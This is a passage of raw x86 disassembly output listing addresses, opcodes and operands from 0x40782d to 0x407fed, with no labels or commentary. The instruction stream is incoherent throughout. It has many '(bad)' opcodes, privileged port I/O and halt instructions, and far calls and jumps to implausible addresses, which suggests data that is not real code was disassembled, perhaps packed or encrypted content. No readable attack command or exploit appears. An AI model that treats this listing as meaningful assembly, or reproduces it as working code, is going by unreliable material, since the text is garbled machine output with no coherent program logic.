  40782d:	adc    cl,BYTE PTR [ecx]
  40782f:	dec    BYTE PTR [ebp+ebp*8-0x8b5dbf6]
  407836:	(bad)  
  407837:	fadd   DWORD PTR [ebp+0x32]
  40783a:	lea    ebx,[ebx+0x43c8106c]
  407840:	add    ebp,DWORD PTR ds:0x8a1f86b8
  407846:	sub    ebx,DWORD PTR [esi+0x5e]
  407849:	(bad)  
  40784a:	adc    BYTE PTR [ebx+0x76],dl
  40784d:	mov    es,WORD PTR [edx+eax*2-0x29]
  407851:	imul   ebp,DWORD PTR [ebp+0x1b],0x48daaeb1
  407858:	(bad)
  40785c:	js     0x4077e3
  40785e:	add    cl,al
  407860:	mov    ecx,0xcc0e6273
  407865:	mov    ebx,0x71eda77c
  40786a:	xor    eax,0x38fd881b
  40786f:	or     cl,BYTE PTR [ebx+0xa072bbf]
  407875:	push   ebx
  407876:	cmc    
  407877:	adc    eax,0x6babccec
  40787c:	dec    ecx
  40787d:	sub    al,0xf2
  40787f:	xchg   edx,eax
  407880:	enter  0xf319,0xfa
  407884:	inc    ebx
  407885:	aaa    
  407886:	sbb    al,0x97
  407888:	and    esp,DWORD PTR [ebx]
  40788a:	sbb    DWORD PTR [edi],ecx
  40788c:	mov    edi,0x70052d5f
  407891:	and    eax,eax
  407893:	mov    ds:0xd6643c32,eax
  407898:	mov    eax,0xab6a8640
  40789d:	scas   eax,DWORD PTR es:[edi]
  40789e:	fidivr DWORD PTR [esi+0xb]
  4078a1:	lahf   
  4078a2:	inc    esp
  4078a3:	cmp    edx,ecx
  4078a5:	cmp    cl,BYTE PTR [ebp+0x33]
  4078a8:	stos   DWORD PTR es:[edi],eax
  4078a9:	sbb    al,BYTE PTR [ebx+0x30]
  4078ac:	adc    eax,0xa193bf25
  4078b1:	adc    DWORD PTR [ecx+edi*4+0x1c7b10c9],eax
  4078b8:	call   FWORD PTR [ebx]
  4078ba:	lods   eax,DWORD PTR ds:[esi]
  4078bb:	popf   
  4078bc:	lahf   
  4078bd:	cmc    
  4078be:	std    
  4078bf:	sub    esi,DWORD PTR [esi-0x72]
  4078c2:	inc    esi
  4078c3:	inc    eax
  4078c4:	cmc    
  4078c5:	in     al,0xa4
  4078c7:	pop    esp
  4078c8:	push   ebx
  4078c9:	and    BYTE PTR [eax+0x169f303c],dl
  4078cf:	cmp    cl,BYTE PTR [ecx+0x59]
  4078d2:	(bad)  
  4078d3:	std    
  4078d4:	dec    ebp
  4078d5:	in     al,0x33
  4078d7:	pop    esi
  4078d8:	cmp    eax,0x10c66bbf
  4078dd:	and    bl,BYTE PTR ds:0x61ed0808
  4078e3:	repnz lods al,BYTE PTR ds:[esi]
  4078e5:	test   al,0xc2
  4078e7:	cmp    DWORD PTR [ebp+0x22e2d75d],esi
  4078ed:	scas   eax,DWORD PTR es:[edi]
  4078ee:	daa    
  4078ef:	push   edi
  4078f0:	fadd   st(3),st
  4078f2:	adc    BYTE PTR [esi-0x74841854],ah
  4078f8:	xchg   edi,eax
  4078f9:	xor    al,0x7d
  4078fb:	addr16 jns 0x407919
  4078fe:	ror    esp,cl
  407900:	push   eax
  407901:	jp     0x4078d0
  407903:	les    esp,FWORD PTR [edi+0x25]
  407906:	jecxz  0x407966
  407908:	xchg   ecx,eax
  407909:	mov    ah,0x1b
  40790b:	pushf  
  40790c:	inc    esi
  40790d:	and    BYTE PTR [eax-0x7840ae4e],dh
  407913:	dec    ebp
  407914:	xor    DWORD PTR [eax-0xf733dbd],edi
  40791a:	push   0xf08cb4b2
  40791f:	pop    eax
  407920:	adc    ebp,DWORD PTR [esi+0x97ee404]
  407926:	loopne 0x4078d8
  407928:	pop    eax
  407929:	mov    ecx,ds
  40792b:	fadd   st,st(0)
  40792d:	sar    DWORD PTR [ebp+0x7f],0xe0
  407931:	mov    ah,0xf1
  407933:	(bad)  
  407935:	dec    esi
  407936:	scas   eax,DWORD PTR es:[edi]
  407937:	mov    esp,0x81f529b7
  40793c:	push   0x1
  40793e:	mov    eax,0x6050bd35
  407943:	loopne 0x40790d
  407945:	mov    dl,0x2f
  407947:	mov    ds:0xd9589086,eax
  40794c:	push   cs
  40794d:	ins    DWORD PTR es:[edi],dx
  40794e:	xchg   esp,eax
  40794f:	xchg   ebp,eax
  407950:	test   eax,0xdfc3c93e
  407955:	pop    ds
  407956:	pop    esp
  407957:	xchg   DWORD PTR ds:0x95531db6,esp
  40795d:	jno    0x407980
  40795f:	mov    eax,0xbcc71376
  407964:	and    eax,0xd8b60a1e
  407969:	dec    DWORD PTR [eax+0x3d31e612]
  40796f:	mov    al,ds:0x96096f3
  407974:	cli    
  407975:	push   ebx
  407976:	add    DWORD PTR [eax+0x53ef2d0f],0xdbd29783
  407980:	inc    eax
  407981:	xchg   dl,bh
  407983:	sbb    BYTE PTR [esi+0x37a5e1f3],0xe1
  40798a:	pop    es
  40798b:	mov    ch,0x3f
  40798d:	xor    eax,DWORD PTR ss:[ecx+0x1b]
  407991:	fld    TBYTE PTR [eax+0x40]
  407994:	std    
  407995:	jge    0x407955
  407997:	push   0xffffff89
  407999:	mov    ebp,0x3fbccde3
  40799e:	fnstenv [edi+0x3a]
  4079a1:	fimul  DWORD PTR [ebx+0x22]
  4079a4:	xchg   DWORD PTR [ebp+0x432b0adb],edx
  4079aa:	pop    ebp
  4079ab:	fbld   TBYTE PTR [edx*2+0x16100022]
  4079b2:	shl    BYTE PTR [ebx],cl
  4079b4:	xchg   esi,eax
  4079b5:	sub    DWORD PTR ds:0xe4f0e971,0xea44acc5
  4079bf:	add    eax,0x784695cd
  4079c4:	out    dx,eax
  4079c5:	mov    al,ds:0xc72692b4
  4079ca:	bound  edi,QWORD PTR [ebx]
  4079cc:	in     al,0x76
  4079ce:	ins    BYTE PTR es:[edi],dx
  4079cf:	ror    DWORD PTR [ecx-0x16f96dc5],cl
  4079d5:	push   esi
  4079d6:	mov    eax,ds:0x182775d6
  4079db:	pop    ebx
  4079dc:	adc    DWORD PTR ds:0x1bd56230,esi
  4079e2:	sub    DWORD PTR [ecx],edi
  4079e4:	lds    ecx,FWORD PTR [ecx-0x1b717cab]
  4079ea:	out    0xaf,eax
  4079ec:	jmp    0x407a28
  4079ee:	in     al,dx
  4079ef:	js     0x407a35
  4079f1:	icebp  
  4079f2:	mov    esp,0xf0c66edd
  4079f7:	fcom   DWORD PTR [esi-0xc5fef8d]
  4079fd:	add    esp,DWORD PTR [ebx+ebp*4+0x44943d51]
  407a04:	inc    edx
  407a05:	popf   
  407a06:	call   0x9e65106f
  407a0b:	js     0x407a70
  407a0d:	mov    DWORD PTR [edi],ecx
  407a0f:	adc    al,dl
  407a11:	gs mov esp,0x471aa60e
  407a17:	dec    ecx
  407a18:	lods   eax,DWORD PTR ds:[esi]
  407a19:	xor    BYTE PTR [eax-0x7a485130],ch
  407a1f:	bound  ecx,QWORD PTR [edi-0x25]
  407a22:	rol    DWORD PTR [ebp-0x53],1
  407a25:	(bad)  
  407a26:	or     BYTE PTR [edi],ch
  407a28:	sahf   
  407a29:	xor    BYTE PTR [esi+edi*4],0xfe
  407a2d:	div    dh
  407a2f:	inc    esi
  407a30:	push   esp
  407a31:	pop    edi
  407a32:	lock pop ebp
  407a34:	cmc    
  407a35:	je     0x407a6e
  407a37:	jl     0x4079d2
  407a39:	cwde   
  407a3a:	outs   dx,BYTE PTR ds:[esi]
  407a3b:	xor    bh,dl
  407a3d:	jae    0x407a77
  407a3f:	je     0x4079d3
  407a41:	mov    al,0xdf
  407a43:	mov    dh,0x68
  407a45:	pop    esp
  407a46:	into   
  407a47:	mov    edi,esp
  407a49:	daa    
  407a4a:	out    0xc7,al
  407a4c:	stos   DWORD PTR es:[edi],eax
  407a4d:	mov    ah,0x4c
  407a4f:	pop    edi
  407a50:	jbe    0x407a45
  407a52:	xor    DWORD PTR [ebx-0x2a],eax
  407a55:	cmp    bl,BYTE PTR ds:0xeddb7941
  407a5b:	sar    ah,cl
  407a5d:	sub    BYTE PTR [ecx+edi*4+0x72],ah
  407a61:	shl    DWORD PTR [ecx+0x9],0xa
  407a65:	mov    edi,0x54254c5e
  407a6a:	mov    edx,0xa20a0812
  407a6f:	hlt    
  407a70:	fwait
  407a71:	adc    ebx,DWORD PTR [ebp-0x451be250]
  407a77:	add    al,0x4e
  407a79:	lds    edi,FWORD PTR [esi-0x44]
  407a7c:	xlat   BYTE PTR ds:[ebx]
  407a7d:	mov    dh,0xee
  407a7f:	and    BYTE PTR [esi-0x79],dh
  407a82:	xor    dh,bh
  407a84:	imul   esi,DWORD PTR [edi],0x47
  407a87:	mov    bl,0x95
  407a89:	std    
  407a8a:	lods   al,BYTE PTR ds:[esi]
  407a8b:	pop    esi
  407a8c:	(bad)  
  407a8d:	cmp    ebx,DWORD PTR [ebp+ecx*8+0x1]
  407a91:	mov    edi,DWORD PTR [edx+eax*2]
  407a94:	test   eax,0xb68c7037
  407a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a9a:	out    0xb3,al
  407a9c:	ret    0x36a0
  407a9f:	pop    ecx
  407aa0:	std    
  407aa1:	pop    ss
  407aa2:	sub    ecx,edi
  407aa4:	cmp    BYTE PTR [esi+0x178357f3],0x12
  407aab:	jmp    0x7e3af1b1
  407ab0:	mov    al,ds:0xc309c6d6
  407ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab6:	test   BYTE PTR [ebx],dh
  407ab8:	push   ds
  407ab9:	sub    esi,DWORD PTR [ecx]
  407abb:	pop    edi
  407abc:	mov    al,0x5b
  407abe:	inc    esi
  407abf:	fcomp  DWORD PTR [ebx]
  407ac1:	push   esi
  407ac2:	add    dl,BYTE PTR [esi]
  407ac4:	adc    DWORD PTR [edx+0x30243985],edi
  407aca:	mov    eax,DWORD PTR [ebx+0x63bad8c8]
  407ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad1:	push   ss
  407ad2:	push   es
  407ad3:	int3   
  407ad4:	fcomp  DWORD PTR [esi-0x23dec415]
  407ada:	or     eax,0x19c2db39
  407adf:	mov    al,ds:0x7981c883
  407ae4:	call   0xcb8a1344
  407ae9:	dec    edx
  407aea:	mov    al,ds:0xb2cff676
  407aef:	mov    ebp,0xd497e451
  407af4:	and    eax,0xcd7fd4be
  407af9:	inc    edx
  407afa:	ins    DWORD PTR es:[edi],dx
  407afb:	cmc    
  407afc:	sub    eax,0x26f3e424
  407b01:	out    0x75,al
  407b03:	adc    ch,BYTE PTR [ebp-0x5a159694]
  407b09:	xor    eax,0xda87ad4c
  407b0e:	shl    esp,0x18
  407b11:	inc    ebp
  407b12:	pop    es
  407b13:	out    dx,al
  407b14:	iret   
  407b15:	xlat   BYTE PTR ds:[ebx]
  407b16:	cdq    
  407b17:	enter  0xcde9,0x11
  407b1b:	loopne 0x407b56
  407b1d:	pop    edx
  407b1e:	leave  
  407b1f:	push   cs
  407b20:	sbb    BYTE PTR [ebx],dh
  407b22:	mov    ch,0x50
  407b24:	xor    eax,0x71e7126d
  407b29:	(bad)  [ecx-0x1e]
  407b2c:	int3   
  407b2d:	and    al,0xa4
  407b2f:	xchg   esi,eax
  407b30:	retf   0xac3a
  407b33:	sbb    eax,0xc6450793
  407b38:	ds and eax,0x36a96480
  407b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b3f:	push   0xffffffa5
  407b41:	ret    0xa0f3
  407b44:	mov    cl,0xcf
  407b46:	sub    al,0xc
  407b48:	mov    edi,0xbf3c2a31
  407b4d:	mov    ah,0xa5
  407b4f:	mov    DWORD PTR [esi],0x8890c6f7
  407b55:	out    dx,eax
  407b56:	xor    eax,0xb0b2b367
  407b5b:	dec    ebx
  407b5c:	push   es
  407b5d:	or     dh,BYTE PTR [ebx+0x5a]
  407b60:	adc    BYTE PTR [edx],ah
  407b62:	cmp    bh,bl
  407b64:	push   ss
  407b65:	cmp    bl,cl
  407b67:	dec    esp
  407b68:	shr    BYTE PTR [eax-0x320d41f5],1
  407b6e:	mov    esi,0x79ace6b6
  407b73:	les    esi,FWORD PTR [edi+0x8bd0770]
  407b79:	xchg   edx,eax
  407b7a:	data16 (bad) 
  407b7c:	jno    0x407bf1
  407b7e:	(bad)  
  407b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b80:	popf   
  407b81:	aaa    
  407b82:	inc    ebp
  407b83:	repnz mov esi,0xe4cc5f8c
  407b89:	arpl   sp,cx
  407b8b:	mov    edi,0xcf4c5fe0
  407b90:	mov    WORD PTR [eax-0x4f],ss
  407b93:	out    dx,al
  407b94:	pop    edx
  407b95:	cli    
  407b96:	push   eax
  407b97:	rol    DWORD PTR [ebx+0x4a],cl
  407b9a:	push   es
  407b9b:	mov    al,0x7e
  407b9d:	sub    DWORD PTR [edi+0x6e],ebp
  407ba0:	lea    edx,[esi+0x2c74365f]
  407ba6:	rcl    DWORD PTR [edi-0x7c17cb93],0x8b
  407bad:	adc    al,0xde
  407baf:	add    dl,BYTE PTR [edx+0x74]
  407bb2:	dec    edi
  407bb3:	sbb    bh,bl
  407bb5:	or     DWORD PTR [eax+0x146a44cc],ebx
  407bbb:	xchg   ebp,eax
  407bbc:	(bad)  
  407bbd:	das    
  407bbe:	sub    BYTE PTR [esi+ebx*1],dh
  407bc1:	adc    cl,ch
  407bc3:	cwde   
  407bc4:	add    eax,0x10e90138
  407bc9:	nop
  407bca:	xor    DWORD PTR [eax+0xe],esi
  407bcd:	add    eax,0xd74c7c84
  407bd2:	scas   al,BYTE PTR es:[edi]
  407bd3:	dec    ebp
  407bd4:	popa   
  407bd5:	xor    cl,ah
  407bd7:	lahf   
  407bd8:	sbb    cl,BYTE PTR [esi-0xe2c11fe]
  407bde:	outs   dx,BYTE PTR ds:[esi]
  407bdf:	out    0xf4,eax
  407be1:	pop    ecx
  407be2:	mov    bh,BYTE PTR [ebx-0x2908ab2d]
  407be8:	(bad)  [edx-0x59]
  407beb:	dec    ebp
  407bec:	and    eax,0x953e0692
  407bf1:	xchg   esi,eax
  407bf2:	pop    edi
  407bf3:	js     0x407c0f
  407bf5:	sub    al,0xc2
  407bf7:	scas   eax,DWORD PTR es:[edi]
  407bf8:	retf   0xb066
  407bfb:	push   es
  407bfc:	pop    es
  407bfd:	mov    cl,BYTE PTR [esi+0x25]
  407c00:	adc    al,BYTE PTR [ecx+0x118c3108]
  407c06:	in     al,0x42
  407c08:	in     eax,0x46
  407c0a:	inc    ebx
  407c0b:	lods   eax,DWORD PTR ds:[esi]
  407c0c:	and    edi,DWORD PTR [ebx]
  407c0e:	adc    DWORD PTR [edx+0x70],0xc85fcc70
  407c15:	add    WORD PTR [esi+ebx*1-0x3],si
  407c1a:	pop    edi
  407c1b:	fistp  QWORD PTR [eax-0x15]
  407c1e:	inc    edx
  407c1f:	sahf   
  407c20:	iret   
  407c21:	or     eax,0xc5e649d2
  407c26:	xchg   ebx,eax
  407c27:	(bad)  
  407c28:	popa   
  407c29:	popf   
  407c2a:	mov    DWORD PTR [ebp+0x47],esi
  407c2d:	jmp    0x407c9d
  407c2f:	dec    ebp
  407c30:	cmp    eax,edi
  407c32:	arpl   WORD PTR [ebp-0x6f],di
  407c35:	ins    DWORD PTR es:[edi],dx
  407c36:	fcomp  DWORD PTR [edx-0x3e8a4f33]
  407c3c:	popf   
  407c3d:	xor    dh,BYTE PTR [esi-0x3b]
  407c40:	imul   ebx,DWORD PTR [ebp-0x3],0xec51858f
  407c47:	loope  0x407c66
  407c49:	pop    esi
  407c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c4b:	fmul   st(5),st
  407c4d:	out    dx,eax
  407c4e:	bound  ecx,QWORD PTR [eax]
  407c50:	xchg   ebx,ebp
  407c52:	mov    ds:0xcc7f5d82,eax
  407c57:	cld    
  407c58:	imul   ecx,DWORD PTR [ebx-0x780fb6c6],0x6f
  407c5f:	inc    ebp
  407c60:	inc    eax
  407c61:	aam    0x28
  407c63:	cwde   
  407c64:	inc    edi
  407c65:	pop    ds
  407c66:	pop    esp
  407c67:	int3   
  407c68:	std    
  407c69:	push   0xfffffff6
  407c6b:	lds    ebp,FWORD PTR [edi-0x7c4c006]
  407c71:	sbb    eax,0xb1ab2f9d
  407c76:	jbe    0x407cad
  407c78:	cmp    al,BYTE PTR ds:0x77077360
  407c7e:	jg     0x407cc6
  407c80:	push   0x7eaaba8e
  407c85:	jl     0x407c4c
  407c87:	push   0xb200632d
  407c8c:	addr16 (bad) 
  407c8e:	jmp    0x407c97
  407c90:	xchg   ebp,eax
  407c91:	arpl   WORD PTR [esi+0x201ccfd6],ax
  407c97:	das    
  407c98:	hlt    
  407c99:	push   ss
  407c9a:	xchg   ecx,eax
  407c9b:	icebp  
  407c9c:	or     edx,DWORD PTR [ebp+0x2]
  407c9f:	mov    al,ds:0x4c7655e7
  407ca4:	dec    esi
  407ca5:	jo     0x407ca0
  407ca7:	jmp    0x4f963553
  407cac:	test   BYTE PTR [esi],al
  407cae:	rcr    ebx,1
  407cb0:	lods   eax,DWORD PTR ds:[esi]
  407cb1:	mov    ds:0x908b3242,al
  407cb6:	cld    
  407cb7:	mov    cl,0x34
  407cb9:	mov    ds:0x5a33d4f4,al
  407cbe:	or     DWORD PTR [ebp+0xe55c676],0xc120aab
  407cc8:	lea    ebp,[edi-0x103657b5]
  407cce:	stc    
  407ccf:	gs sub eax,0x6643c752
  407cd5:	mov    ebp,0x62555421
  407cda:	dec    ecx
  407cdb:	sbb    eax,0xa3f67c86
  407ce0:	cmp    al,0x34
  407ce2:	mov    ebp,0x9d7b171d
  407ce7:	or     edi,DWORD PTR [ebx+0x4d]
  407cea:	rol    BYTE PTR [si-0x66],0x42
  407cef:	movd   DWORD PTR [ebx+0x46],mm2
  407cf3:	popa   
  407cf4:	jmp    0x407ca6
  407cf6:	add    eax,0x350f76d
  407cfb:	xchg   esi,eax
  407cfc:	lods   al,BYTE PTR ds:[esi]
  407cfd:	lahf   
  407cfe:	jnp    0x407ceb
  407d00:	push   ebp
  407d01:	iret   
  407d02:	shl    DWORD PTR ds:0xeabd4085,cl
  407d08:	xchg   ebp,eax
  407d09:	repz jmp 0xabaa:0x336dd0fe
  407d11:	jae    0x407d73
  407d13:	loopne 0x407d91
  407d15:	fs xchg esi,eax
  407d17:	add    al,0xc7
  407d19:	lea    ecx,[ebp+0x2d]
  407d1c:	test   ch,dh
  407d1e:	add    al,0x3b
  407d20:	inc    BYTE PTR [esi+0x1ed041fc]
  407d26:	imul   ebx,DWORD PTR [edx-0x9],0xffffffba
  407d2a:	(bad)  
  407d2b:	aad    0x74
  407d2d:	xchg   esi,eax
  407d2e:	or     dl,ch
  407d30:	(bad)  
  407d31:	ficomp DWORD PTR [ebx-0x2666a350]
  407d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d38:	pop    ss
  407d39:	xchg   ebx,eax
  407d3a:	cmp    ax,0x84b1
  407d3e:	icebp  
  407d3f:	and    bh,bl
  407d41:	fstp   DWORD PTR [esi-0x31e3452b]
  407d47:	retf   0xa878
  407d4a:	scas   eax,DWORD PTR es:[edi]
  407d4b:	xchg   ebx,eax
  407d4c:	xchg   esp,eax
  407d4d:	scas   eax,DWORD PTR es:[edi]
  407d4e:	push   esp
  407d4f:	jb     0x407d63
  407d51:	addr16 fs pop ebx
  407d54:	mov    fs,WORD PTR [edx]
  407d56:	test   DWORD PTR [ebx],eax
  407d58:	lds    eax,FWORD PTR [esi]
  407d5a:	xor    ecx,ecx
  407d5c:	into   
  407d5d:	out    0xb1,al
  407d5f:	xchg   edi,eax
  407d60:	int    0xc8
  407d62:	ss xchg edx,eax
  407d64:	leave  
  407d65:	mov    ch,0x9d
  407d67:	leave  
  407d68:	int    0x43
  407d6a:	mov    ah,0xc3
  407d6c:	cli    
  407d6d:	add    ebp,DWORD PTR [eax+0x11]
  407d70:	mov    DWORD PTR [edx-0x985dcbb],edx
  407d76:	loope  0x407d0d
  407d78:	mov    al,ds:0x19d714ef
  407d7d:	mov    ah,0x5c
  407d7f:	inc    ebp
  407d80:	out    dx,al
  407d81:	sub    BYTE PTR [ebp-0x2],0x7e
  407d85:	dec    edx
  407d86:	push   edx
  407d87:	je     0x407d45
  407d89:	aam    0x7d
  407d8b:	scas   al,BYTE PTR es:[edi]
  407d8c:	shl    DWORD PTR [esp+esi*4],0xe2
  407d90:	xchg   DWORD PTR [ebx+0xe],ebx
  407d93:	outs   dx,BYTE PTR ds:[esi]
  407d94:	jne    0x407d41
  407d96:	inc    edx
  407d97:	fdivr  DWORD PTR [ebx]
  407d99:	xor    ecx,DWORD PTR [eax+0x79]
  407d9c:	and    eax,0x7ff05216
  407da1:	xor    DWORD PTR [eax-0x76],eax
  407da4:	std    
  407da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da6:	rcr    BYTE PTR [ecx-0x33],1
  407da9:	into   
  407daa:	push   es
  407dab:	xchg   edx,eax
  407dac:	sahf   
  407dad:	adc    DWORD PTR [edi-0x9],ecx
  407db0:	adc    ch,BYTE PTR [edx-0x661cf64a]
  407db6:	inc    edx
  407db7:	add    BYTE PTR [ebx+0x16e0e285],dh
  407dbd:	add    al,0xf9
  407dbf:	scas   al,BYTE PTR es:[edi]
  407dc0:	push   cs
  407dc1:	and    dl,BYTE PTR [ebp+ecx*1-0x2]
  407dc5:	cmp    eax,0x6a33bdc
  407dca:	loopne 0x407d60
  407dcc:	enter  0x6ed3,0x67
  407dd0:	inc    esi
  407dd1:	dec    ecx
  407dd2:	mov    esi,0xf329bd1b
  407dd7:	or     BYTE PTR [ecx+0x76],dl
  407dda:	sbb    BYTE PTR [ecx+esi*8],dl
  407ddd:	aam    0x35
  407ddf:	pop    esp
  407de0:	call   0x17632cce
  407de5:	and    DWORD PTR [esp+ecx*4],ebx
  407de8:	aam    0x45
  407dea:	arpl   WORD PTR [eax+0x14],dx
  407ded:	fldcw  WORD PTR [ebx+0xd]
  407df0:	jb     0x407dbf
  407df2:	fs stc 
  407df4:	adc    eax,0x76a732e6
  407df9:	xor    ah,BYTE PTR [edi+0x4b]
  407dfc:	gs inc ecx
  407dfe:	xchg   DWORD PTR [edi],ebx
  407e00:	ins    DWORD PTR es:[edi],dx
  407e01:	(bad)  
  407e03:	inc    esp
  407e04:	fisubr WORD PTR [ebx-0x40621999]
  407e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e0b:	test   al,0xc2
  407e0d:	fisttp QWORD PTR [edi]
  407e0f:	inc    edx
  407e10:	(bad)  
  407e11:	cdq    
  407e12:	not    BYTE PTR [ebx-0x38bc3721]
  407e18:	lahf   
  407e19:	pusha  
  407e1a:	into   
  407e1b:	lock sub ebx,DWORD PTR [edx+0x31]
  407e1f:	es push ecx
  407e21:	push   esi
  407e22:	out    dx,eax
  407e23:	ror    DWORD PTR ds:0x9e99c06c,1
  407e29:	cmp    eax,0xc96da5de
  407e2e:	test   BYTE PTR [esi],ah
  407e30:	cmp    BYTE PTR [ecx+0x2e863816],ah
  407e36:	outs   dx,BYTE PTR ds:[esi]
  407e37:	test   DWORD PTR [eax+0x6f],edx
  407e3a:	retf   
  407e3b:	adc    eax,0x9bbc3041
  407e40:	add    eax,0xef986201
  407e45:	sbb    ecx,DWORD PTR [ebx+0x77]
  407e48:	cdq    
  407e49:	(bad)  
  407e4a:	jle    0x407dd2
  407e4c:	imul   ecx,DWORD PTR [edi],0xbfc92b0d
  407e52:	test   BYTE PTR [ecx],cl
  407e54:	(bad)  
  407e55:	jne    0x407eac
  407e57:	bound  edi,QWORD PTR ds:0x93a7129c
  407e5d:	xchg   edx,eax
  407e5e:	je     0x407e1e
  407e60:	or     DWORD PTR [edx],ebp
  407e62:	jb     0x407de6
  407e64:	(bad)  
  407e65:	repz call 0x61adb22b
  407e6b:	push   esi
  407e6c:	ds cs in eax,dx
  407e6f:	les    ebx,FWORD PTR [ebx+edi*2-0x37]
  407e73:	jns    0x407ee8
  407e75:	mov    dl,0xbc
  407e77:	ds out 0x57,al
  407e7a:	mov    esi,0xc8e0b33e
  407e7f:	stc    
  407e80:	dec    eax
  407e81:	adc    bh,cl
  407e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e84:	inc    edi
  407e85:	js     0x407ee6
  407e87:	rcr    BYTE PTR [esi-0x52fd36b7],1
  407e8d:	stos   BYTE PTR es:[edi],al
  407e8e:	cmp    DWORD PTR [ecx],esi
  407e90:	mov    ah,0x43
  407e93:	cld    
  407e94:	addr16 push ss
  407e96:	or     ch,BYTE PTR [edi-0x590a596b]
  407e9c:	mov    ebp,0xe7da4d4b
  407ea1:	ins    BYTE PTR es:[edi],dx
  407ea2:	arpl   di,ax
  407ea4:	xchg   eax,edx
  407ea6:	push   edx
  407ea7:	and    DWORD PTR [eax],ebx
  407ea9:	mov    ebp,0x54355dee
  407eae:	and    al,0xd5
  407eb0:	adc    BYTE PTR [eax-0x18],bl
  407eb3:	xor    ch,BYTE PTR [edi+edx*2+0x78f4d81]
  407eba:	pushf  
  407ebb:	add    esp,ebx
  407ebd:	pop    ebp
  407ebe:	push   0xffffffae
  407ec0:	sete   BYTE PTR [eax-0x5b9deb9d]
  407ec7:	sub    edx,esi
  407ec9:	xchg   ecx,eax
  407eca:	add    DWORD PTR [edi+eiz*8+0x77],esp
  407ece:	adc    ebx,DWORD PTR [ebp+0x6817cd80]
  407ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed5:	inc    ecx
  407ed6:	jmp    0x407efe
  407ed8:	inc    eax
  407ed9:	xchg   edi,eax
  407eda:	add    al,0xe5
  407edc:	fisubr WORD PTR [esp+ecx*8-0x67b5437b]
  407ee3:	and    eax,0x5f71fe81
  407ee8:	(bad)  
  407ee9:	call   0x9c77bdfb
  407eee:	fadd   QWORD PTR [ebx]
  407ef0:	cmp    ecx,DWORD PTR [ecx+0x745f9249]
  407ef6:	ins    DWORD PTR es:[edi],dx
  407ef7:	mov    bl,BYTE PTR [ebx]
  407ef9:	cs jnp 0x407edb
  407efc:	push   eax
  407efd:	fmul   QWORD PTR [ecx-0x2ad43452]
  407f03:	test   DWORD PTR [esi+esi*4-0x6eb9a4ba],esp
  407f0a:	inc    ebx
  407f0b:	mov    dl,0x60
  407f0d:	pop    es
  407f0e:	lds    edi,FWORD PTR [edx-0x6672907a]
  407f14:	mov    edx,0x6e65d3ff
  407f19:	sub    al,0x91
  407f1b:	pop    es
  407f1c:	dec    al
  407f1e:	adc    ecx,DWORD PTR [edi]
  407f20:	jns    0x407f0b
  407f22:	mov    esi,0x72249d9f
  407f27:	sbb    ebp,DWORD PTR [ebx-0x49400fd2]
  407f2d:	xchg   esp,eax
  407f2e:	(bad)  
  407f2f:	cmp    edx,DWORD PTR [ecx-0x59]
  407f32:	and    esi,DWORD PTR [ecx-0x274f8fa0]
  407f38:	(bad)
  407f3b:	fs xchg edx,eax
  407f3d:	mov    esp,0xc64d2f7a
  407f42:	stc    
  407f43:	xchg   DWORD PTR [edi],ebp
  407f45:	xchg   esi,eax
  407f46:	mov    dh,0xef
  407f49:	and    BYTE PTR [edi],0x4d
  407f4c:	jbe    0x407f6f
  407f4e:	rcr    edi,cl
  407f50:	aam    0x36
  407f52:	fmul   QWORD PTR [edx+esi*1+0x62]
  407f56:	sub    al,0xa0
  407f58:	imul   ebp,DWORD PTR [ebp+0x58ba0a11],0xfffffff3
  407f5f:	inc    esp
  407f60:	xchg   ebp,eax
  407f61:	pop    es
  407f62:	pop    esi
  407f63:	loop   0x407fa6
  407f65:	clc    
  407f66:	xchg   edx,eax
  407f67:	loopne 0x407ef7
  407f69:	pop    ss
  407f6a:	push   0x24
  407f6c:	retf   
  407f6d:	mov    ecx,DWORD PTR [ebp-0x5f]
  407f70:	push   eax
  407f71:	and    eax,0x71a7268d
  407f76:	jb     0x407fc0
  407f78:	mov    ds,WORD PTR [ebx]
  407f7a:	scas   eax,DWORD PTR es:[edi]
  407f7b:	popf   
  407f7c:	xchg   edi,eax
  407f7d:	pop    es
  407f7e:	les    edi,FWORD PTR [ebx-0xc7c8a7]
  407f84:	jae    0x407f94
  407f86:	and    DWORD PTR [bp+si+0x3a24],esp
  407f8b:	ja     0x40800a
  407f8d:	and    BYTE PTR [esi-0x31],bh
  407f90:	xor    eax,0x9c749e07
  407f95:	jo     0x407fe5
  407f97:	sub    BYTE PTR [ecx-0x24],bh
  407f9a:	js     0x407fa5
  407f9c:	sub    ebx,ebp
  407f9e:	xchg   ebp,eax
  407f9f:	xlat   BYTE PTR ds:[ebx]
  407fa0:	mov    edx,0xcb3558f6
  407fa5:	push   cs
  407fa6:	aaa    
  407fa7:	call   0x15ef:0xf6a5ea09
  407fae:	lahf   
  407faf:	(bad)  
  407fb0:	fsubr  DWORD PTR [eax-0x76]
  407fb3:	daa    
  407fb4:	int3   
  407fb5:	inc    ebx
  407fb6:	add    al,0xf5
  407fb8:	pusha  
  407fb9:	loop   0x40800d
  407fbb:	sub    al,dh
  407fbd:	ins    BYTE PTR es:[edi],dx
  407fbe:	cmp    eax,0xc3f50d91
  407fc3:	loope  0x407fb2
  407fc5:	jecxz  0x40803d
  407fc7:	pushf  
  407fc8:	imul   esp,DWORD PTR [edx+0x44],0x74
  407fcc:	loop   0x407f74
  407fce:	mov    ebp,0x52319fe2
  407fd3:	shl    al,cl
  407fd5:	jae    0x408027
  407fd7:	pop    edx
  407fd8:	in     al,dx
  407fd9:	(bad)  
  407fda:	or     ebp,edi
  407fdc:	cdq    
  407fdd:	xor    esp,ebp
  407fdf:	push   esp
  407fe0:	xchg   edi,eax
  407fe1:	mov    ecx,0xe30f1ba2
  407fe6:	je     0x407f70
  407fe8:	jmp    0xd009e5be
  407fed:	or     al,0x2e
